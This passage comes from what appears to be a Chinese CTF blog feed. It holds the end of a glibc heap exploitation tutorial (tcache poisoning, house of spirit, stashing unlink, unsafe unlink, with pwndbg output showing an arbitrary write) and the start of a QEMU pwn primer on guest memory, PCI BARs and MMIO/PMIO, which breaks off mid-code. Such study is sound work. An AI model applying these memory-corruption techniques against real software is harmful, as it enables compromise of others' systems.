alt="image-20210606205214402"></p><p>这个时候我们再 malloc 一个大小 0x300000 ， 由于前面发生的合并，所以我们会得到一个 重叠的 chunk</p><p>然后我们修改 overlapping_chunk 的数据内容的同时，就是把 mmap_chunk_2 的值修改了</p><h2 id="8-tcache-house-of-spirit"><a href="#8-tcache-house-of-spirit" class="headerlink" title="8. tcache_house_of_spirit"></a>8. tcache_house_of_spirit</h2><p>首先 malloc 一个 chunk，并且在栈上有一个可控目标</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620853329/0" alt="image-20210606205811019"></p><p>将这个可控目标伪造成一个一个chunk ，修改其大小</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620866621/0" alt="image-20210606210254084"></p><p>free 这个伪造的 chunk </p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620867677/0" alt="image-20210606210312027"></p><p>此时，我们再malloc 一次，就能把这个栈地址拿回来</p><h2 id="9-tcache-poisoning"><a href="#9-tcache-poisoning" class="headerlink" title="9. tcache_poisoning"></a>9. tcache_poisoning</h2><p>通过劫持修改 tcache fd 的形式来，来获取一个目标地址, 这里的目标是一个栈地址， 作用与 8 挺相似的</p><p>malloc 两个 chunk ，分别为 a 和 b，然后将它们 free </p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620878140/0" alt="image-20210606210601763"></p><p>就有如上的链表结构，假设我们可以溢出第一个 chunk，那么们就能修改第二个 chunk 的fd ,则我们将 chunk b 的fd 修改为栈地址,此时 tcachebins 就变成如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620880800/0" alt="image-20210606210703811"></p><p>我们就发现 变成了 b —&gt; &amp;stack_var ,然后我们只需 malloc 两次就能将栈地址拿到</p><h2 id="10-tcache-stashing-unlink-attack"><a href="#10-tcache-stashing-unlink-attack" class="headerlink" title="10. tcache_stashing_unlink_attack"></a>10. tcache_stashing_unlink_attack</h2><p>tcache 上的 stashing unlink attack</p><p>当你能够覆盖victor-&gt;bk指针时，可以使用这个技术。此外，至少需要用calloc分配一个chunk。</p><p>在glibc中，将smallbin放入tcache的机制给了我们发动攻击的机会. 这种技术允许我们把libc addr写到任何我们想要的地方，并在任何需要的地方创建一个假的chunk。在这种情况下，我们将在堆栈上创建一个假的chunk.</p><p>例如此时我们在栈上伪造一个 chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620898563/0" alt="image-20210606211334467"></p><p>首先我们向 fake_chunk-&gt;bk 写一个可写的地址，以绕过 glibc 中的 bck-&gt;fd = bin。这里我们选择 stack_var[2] 的地址作为fake bk。之后我们可以看到 *（fake_chunk -&gt;bk + 0x10），也就是 stack_var[4]在攻击后将成为libc addr</p><p>malloc 9 个 chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free 7 个 chunk，填满 tcache</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620924124/0" alt="image-20210606212230058"></p><p>这个我们注意一下， tcache bin 的最后一个bin是 chunk_lis[1]</p><p>然后在 unsort bin 里放入两个 chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620928836/0" alt="image-20210606212338715"></p><p>然后分配一个大于 0x90 的chunk ，这个时候 chunk0 和 chunk2 会被放入 smallbin 里</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620930621/0" alt="image-20210606212406868"></p><p>然后，我再 malloc 两个 chunk ，从tcache bin 取出两个 chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620934511/0" alt="image-20210606212505414"></p><p>然后此时，我们假设有一个漏洞能修改 chunklis[2] 的 bck，就是small bin链表头的那个chunk的bk，此时的 bins 如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620945815/0" alt="image-20210606212924738"></p><p>然后我们 calloc 一个新 chunk，此时</p><p>smallbin 的chunk 会被重新填充到 tache bin里，然后我们可以通过 tcache 没有严格的检查，再将 fake chunk 取出</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620956101/0" alt="image-20210606213258292"></p><p>可以看到放入到tcache的首先是我们的 chunklis[2] 然后是我们伪造的bck，接着calloc分配出去的是 chunklis[0]</p><p>通过 calloc 的返回值判断</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620988157/0" alt="image-20210606214448089"></p><h2 id="11-unsafe-unlink"><a href="#11-unsafe-unlink" class="headerlink" title="11. unsafe_unlink"></a>11. unsafe_unlink</h2><p>分配两个足够大的 chunk ，free 后不会被放入 fastbin 和tcache （0x420)</p><p>然后我们需要在堆上伪造一个 chunk</p><p>我们设置好 size ， fd ，bk 以</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13621032579/0" alt="image-20210606220237753"></p><p>我们假设我们在chunk0有一个溢出，这样我们就可以自由地改变chunk1的数据</p><p>例如改chunk1的prev_size 和 size</p><p>bypass check</p><p><code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13621044549/0" alt="image-20210606220615560"></p><p>此时我们 free chunk1，因为此时pre_inuse位为0，就会认为前一个chunk为free，此时我们已经伪造了pre_size，此时就会unlink前一个chunk，也就是unlink fake chunk</p><p>最后 我们可以使用chunk0_ptr覆盖自身，另其指向一个任意位置,达到一个任意地址写的目的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ► 54 chunk0_ptr[3] = (uint64_t) victim_string;</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr</span><br><span class="line"><span class="variable">$22</span> = 0x565403b5b008</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[3]</span><br><span class="line"><span class="variable">$23</span> = 0x565403b5b008</span><br><span class="line">pwndbg&gt; x/20gx 0x565403b5b008</span><br><span class="line">0x565403b5b008:0x0000565403b5b0080x00007f8ca43e66a0</span><br><span class="line">0x565403b5b018 &lt;completed&gt;:0x00000000000000000x0000565403b5b008</span><br><span class="line">0x565403b5b028:0x00000000000000000x0000000000000000</span><br><span class="line">─────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────</span><br><span class="line">   54 chunk0_ptr[3] = (uint64_t) victim_string;</span><br><span class="line">   55</span><br><span class="line"> ► 56 <span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; p/x chunk0_ptr</span><br><span class="line"><span class="variable">$24</span> = 0x7ffe4dfce4d0</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[3]</span><br><span class="line"><span class="variable">$25</span> = 0x7f8ca42210b3</span><br><span class="line">pwndbg&gt; x/s 0x7ffe4dfce4d0</span><br><span class="line">0x7ffe4dfce4d0:<span class="string">&quot;Hello!~&quot;</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   58 chunk0_ptr[0] = 0x4141414142424242LL;</span><br><span class="line"> ► 59 <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/s 0x7ffe4dfce4d0</span><br><span class="line">0x7ffe4dfce4d0:<span class="string">&quot;BBBBAAAA&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>最终chunk0_ptr指针被改成了fake_chunk的fd</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-fastbin-dup&quot;&gt;&lt;a href=&quot;#1-fastbin-dup&quot; class=&quot;headerlink&quot; title=&quot;1. fastbin_dup&quot;&gt;&lt;/a&gt;1. fastbin_dup&lt;/h2&gt;&lt;p&gt;关于 fastbin attack 在glibc
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="CTF/Pwn" scheme="https://billyotry.github.io/tags/CTF-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>qemu pwn基础</title>
    <link href="https://billyotry.github.io/2021/06/07/qemu%20pwn%E5%9F%BA%E7%A1%80/"/>
    <id>https://billyotry.github.io/2021/06/07/qemu%20pwn%E5%9F%BA%E7%A1%80/</id>
    <published>2021-06-07T12:13:55.028Z</published>
    <updated>2021-06-09T13:47:56.038Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qemu概述"><a href="#qemu概述" class="headerlink" title="qemu概述"></a>qemu概述</h1><p>运行的每个qemu虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 host 上的一个 qemu 进程，而虚拟机的执行线程（如CPU、I/O线程等）对应qemu进程的一个线程。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13624747738/0" alt="image-20210607201717970"></p><p>虚拟机所对应的内存结构如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                        Guest&#39; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#39;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure><p>qemu进程会为虚拟机mmap分配出相应的虚拟机申请大小的内存，用于给虚拟机当作物理内存（在虚拟机进程中只会看到虚拟地址），也就是qemu进程的虚拟地址空间作为了我们虚拟机的物理地址空间。我们以<code>pwn-Blizzard CTF 2017 Strng</code>为例，</p><p>它的启动脚本如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure><p>可以看到<code>qemu</code>虚拟机对应的内存为<code>1G</code>，也就是<code>1G</code>的物理内存，我们启动后查看<code>qemu</code>的地址空间，可以看到存在一个大小为<code>0x40000000</code>的内存空间，即为该虚拟机的物理内存空间，并且当我改成<code>2G</code>的时候，此时为<code>0x80000000</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13624816332/0" alt="image-20210607203605134"></p><p>如果我们在qemu虚拟机中申请一段内存空间，该如何在宿主机中找到该内存呢？</p><p>首先将qemu虚拟机中相应的虚拟地址转化为物理地址，该物理地址就是qemu进程为其分配出来的相应偏移，利用该地址加上偏移即是该虚拟地址对应在宿主机中的地址</p><p>在strng虚拟机中运行如下程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="comment">//third</span></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//second</span></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//first</span></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *ptr;</span><br><span class="line">    <span class="keyword">uint64_t</span> ptr_mem;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;Where am I?&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);<span class="comment">//传入我们虚拟机中申请到的虚拟地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>gva_to_gpa</code>即是虚拟机中的虚拟地址转化为物理地址的函数，具体的原理这里就不说了</p><p>由于strng虚拟机是32位的，所以编译命令为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -m32 -O0 mmu.c -o mmu</span><br></pre></td></tr></table></figure><p>使用命令<code>scp -P5555 mmu ubuntu@127.0.0.1:/home/ubuntu</code>将其传至虚拟机中</p><p>最后的结果如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13624850287/0" alt="image-20210607204553119"></p><p>从上图我们知道了虚拟机对应的物理内存地址在qemu进程中的地址为<code>0x7f4e03e00000</code>到<code>0x7f4e43e00000</code>，因此相应的字符串地址为<code>0x7f4e03e00000+0x33613008</code>，在gdb中可以得到验证。</p><h1 id="PCI设备地址空间"><a href="#PCI设备地址空间" class="headerlink" title="PCI设备地址空间"></a>PCI设备地址空间</h1><p>PCI设备（如网卡、声卡这些）都有一个配置空间（PCI Configuration Space），其记录了关于此设备的详细信息。大小为256字节，其中头部64字节是PCI标准规定的，当然并非所有的项都必须填充，位置是固定了，没有用到可以填充0。前16个字节的格式是一定的，包含头部的类型，设备的总类，设备的性质以及制造商等</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13624996615/0" alt="image-20210607212613013"></p><p>其中比较关键的是6个BAR（Base Address Registers），BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR格式如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13625009727/0" alt="image-20210607213046406"></p><p>设备可以申请两类地址空间，memory space和I/O space，它们用BAR的最后一位区别开来。当BAR最后一位为0表示这是映射的是I/O内存，为1是表示这是I/O端口，当是I/O内存的时候1-2为表示内存的类型，bit2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M，bit3表示是否支持可预取。</p><p>而相对于I/O内存，当最后一位为1表示映射的是I/O端口。I/O端口一般不支持预取，所以这里是29位的地址。</p><p>通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。</p><p>通过I/O space访问设备I/O的方式称为port I/O，或者port mmapped I/O，即PMIO，这种情况下CPU需要使用专用的I/O指令如<code>IN/OUT</code>访问I/O端口</p><h2 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h2><p>在MMIO中，内存和I/O设备共享同一个地址空间。 MMIO是应用得最为广泛的一种I/O方法，它使用相同的地址总线来处理内存和I/O设备，I/O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I/O设备的内存，用于访问内存的CPU指令也可来访问I/O设备。每个I/O设备监视CPU的地址总线，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I/O设备，CPU必须预留给I/O一个地址区域，该地址区域不能给物理内存使用。</p><h2 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h2><p>在PMIO中，内存和I/O设备有各自的地址空间。 端口映射I/O通常使用一种特殊的CPU指令，专门执行I/O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读/写1,2,4个字节（例如：<code>outb</code>, <code>outw</code>, <code>outl</code>）到IO设备上。I/O设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在CPU物理接口上增加一个I/O引脚，要么增加一条专用的I/O总线。由于I/O地址空间与内存地址空间是隔离的，所以有时将PMIO称为被隔离的IO(Isolated I/O)。</p><blockquote><p>关于mmio和pmio的区别，个人的理解就是mmio中内存和I/O设备的内存和寄存器共享同一地址空间，就是一段空间中如果某个地址是内存，而不是I/O设备的空间，那么访问这个地址就只能是内存，对于pmio来说就是一个地址可能是内存也可能是I/O设备的空间，具体到底是内存还是I/O设备取决于使用的是普通的访问内存的指令还是专门用于访问I/O设备的指令如<code>IN/OUT</code></p></blockquote><h2 id="qemu中查看pci设备"><a href="#qemu中查看pci设备" class="headerlink" title="qemu中查看pci设备"></a>qemu中查看pci设备</h2><p>依旧通过strng这道题的虚拟机来查看pci设备来增强理解</p><p><code>lspci</code>命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息</p><p>pci设备的寻址是由总线、设备以及功能构成，如下所示：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure><p><code>xx:yy:z</code>的格式为<code>总线:设备:功能</code>的格式</p><p>可以使用lspci命令以树状的形式输出pci结构</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]</span><br><span class="line">           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI</span><br><span class="line">           +-02.0  Device 1234:1111</span><br><span class="line">           +-03.0  Device 1234:11e9</span><br><span class="line">           \-04.0  Intel Corporation 82540EM Gigabit Ethernet Controller</span><br></pre></td></tr></table></figure><p>其中[<code>0000]</code>表示pci的域，PCI域最多可以承载256条总线。每条总线最多可以有32个设备，每个设备最多可以有8个功能。</p><p>总之每个PCI设备有一个总线号，一个设备号，一个功能号标识。PCI规范允许单个系统占用多达256个总线，但是因为 256 个总线对许多大系统是不够的, Linux 现在支持 PCI 域。每个 PCI 域可以占用多达 256 个总线. 每个总线占用 32 个设备, 每个设备可以是 一个多功能卡(例如一个声音设备, 带有一个附加的 CD-ROM 驱动)有最多 8 个功能。</p><p>PCI设备通过<code>VendorIDs</code>、<code>DeviceIDs</code>、以及<code>Class Codes</code>字段区分：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -m -n -s 00:03.0</span><br><span class="line">Device:00:03.0</span><br><span class="line">Class:00ff</span><br><span class="line">Vendor:1234</span><br><span class="line">Device:11e9</span><br><span class="line">SVendor:1af4</span><br><span class="line">SDevice:1100</span><br><span class="line">PhySlot:3</span><br><span class="line">Rev:10</span><br><span class="line"></span><br><span class="line">Device:00:03.0</span><br><span class="line">Class:Unclassified device [00ff]</span><br><span class="line">Vendor:Vendor 1234</span><br><span class="line">Device:Device 11e9</span><br><span class="line">SVendor:Red Hat, Inc</span><br><span class="line">SDevice:Device 1100</span><br><span class="line">PhySlot:3</span><br><span class="line">Rev:10</span><br></pre></td></tr></table></figure><p>也可通过查看其<code>config</code>文件来查看设备的配置空间，数据都可以匹配上，如前两个字节<code>1234</code>为<code>vendor id</code>：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0000000 1234 11e9 0103 0000 0010 00ff 0000 0000</span><br><span class="line">0000010 1000 febf c051 0000 0000 0000 0000 0000</span><br><span class="line">0000020 0000 0000 0000 0000 0000 0000 1af4 1100</span><br><span class="line">0000030 0000 0000 0000 0000 0000 0000 0000 0000</span><br><span class="line">0000040</span><br></pre></td></tr></table></figure><p>查看设备内存空间</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">Physical Slot: 3</span><br><span class="line">Flags: fast devsel</span><br><span class="line">Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">I/O ports at c050 [size=8]</span><br><span class="line">00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00</span><br><span class="line">10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11</span><br><span class="line">30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>可以看到该设备有两个空间：BARO为MMIO空间，地址为<code>0xfebf1000</code>，大小为256；BAR1为PMIO空间，端口地址为<code>0xc050</code>，大小为8。</p><p>可以通过查看<code>resource</code>文件来查看其相应的内存空间：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x  3 root root    0 Jun  7 13:00 .</span><br><span class="line">drwxr-xr-x 11 root root    0 Jun  7 13:00 ..</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 14:18 broken_parity_status</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:58 class</span><br><span class="line">-rw-r--r--  1 root root  256 Jun  7 13:58 config</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 consistent_dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 14:18 d3cold_allowed</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:58 device</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 14:18 enable</span><br><span class="line">lrwxrwxrwx  1 root root    0 Jun  7 14:18 firmware_node -&gt; ../../LNXSYSTM:00/device:00/PNP0A03:00/device:06</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:00 irq</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 local_cpulist</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 local_cpus</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 modalias</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 14:18 msi_bus</span><br><span class="line">drwxr-xr-x  2 root root    0 Jun  7 14:18 power</span><br><span class="line">--w--w----  1 root root 4096 Jun  7 14:18 remove</span><br><span class="line">--w--w----  1 root root 4096 Jun  7 14:18 rescan</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:58 resource</span><br><span class="line">-rw-------  1 root root  256 Jun  7 14:18 resource0</span><br><span class="line">-rw-------  1 root root    8 Jun  7 14:18 resource1</span><br><span class="line">lrwxrwxrwx  1 root root    0 Jun  7 14:18 subsystem -&gt; ../../../bus/pci</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 subsystem_device</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 subsystem_vendor</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 13:00 uevent</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:58 vendor</span><br></pre></td></tr></table></figure><p><code>resource</code>文件包含其他相应空间的数据，如resource0（MMIO空间）以及resource1（PMIO空间）：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识为（flags）。</p><h1 id="qemu中访问I-O空间"><a href="#qemu中访问I-O空间" class="headerlink" title="qemu中访问I/O空间"></a>qemu中访问I/O空间</h1><p>存在mmio与pmio，那么在系统中该如何访问这两个空间呢？访问mmio与pmio都可以采用在内核态访问或者在用户空间编程进行访问。</p><h2 id="访问mmio"><a href="#访问mmio" class="headerlink" title="访问mmio"></a>访问mmio</h2><p>编译内核模块，在内核态访问mmio空间，实例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);<span class="comment">//qwords=8 btyes</span></span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span 